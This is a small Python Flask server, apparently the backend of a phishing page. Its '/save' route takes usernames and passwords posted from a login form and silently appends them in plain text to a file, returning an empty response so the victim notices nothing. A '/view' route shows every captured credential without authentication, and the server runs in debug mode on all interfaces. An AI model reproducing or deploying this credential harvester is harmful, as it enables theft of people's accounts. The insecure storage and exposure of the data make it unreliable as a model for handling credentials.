from flask import Flask, request, render_template, send_from_directory
import os

app = Flask(__name__)

# Home route → serves index.html from templates folder
@app.route('/')
def home():
    return render_template('index.html')

# Save route → silently stores data
@app.route('/save', methods=['POST'])
def save_credentials():
    data = request.get_json(silent=True) or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    # Save credentials to a file next to app.py
    file_path = os.path.join(os.path.dirname(__file__), "credentials.txt")
    with open(file_path, "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    # Silent response (no text shown)
    return ("", 204)

# Optional: view saved data
@app.route('/view')
def view_credentials():
    try:
        with open("credentials.txt", "r") as f:
            rows = f.readlines()
    except FileNotFoundError:
        rows = []

    return "<br>".join(rows)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)